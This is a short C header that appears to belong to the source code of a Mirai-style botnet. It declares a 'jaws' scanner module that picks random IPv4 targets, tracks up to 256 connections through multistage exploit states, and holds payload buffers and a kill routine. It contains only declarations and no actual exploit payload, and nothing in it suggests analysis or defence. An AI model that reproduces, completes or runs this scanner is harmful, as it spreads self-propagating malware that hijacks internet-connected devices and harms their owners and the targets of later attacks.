#pragma once

#include <stdint.h>

#include "includes.h"

#define jaws_SCANNER_MAX_CONNS 256
#define jaws_SCANNER_RAW_PPS 320 

#define jaws_SCANNER_RDBUF_SIZE 256
#define jaws_SCANNER_HACK_DRAIN 64

struct jaws_scanner_connection
{
    int fd, last_recv;
    enum
    {
        jaws_SC_CLOSED,
        jaws_SC_CONNECTING,
        jaws_SC_EXPLOIT_STAGE2,
        jaws_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[jaws_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void jaws_scanner();
void jaws_kill(void);

static void jaws_setup_connection(struct jaws_scanner_connection *);
static ipv4_t jaws_get_random_ip(void);


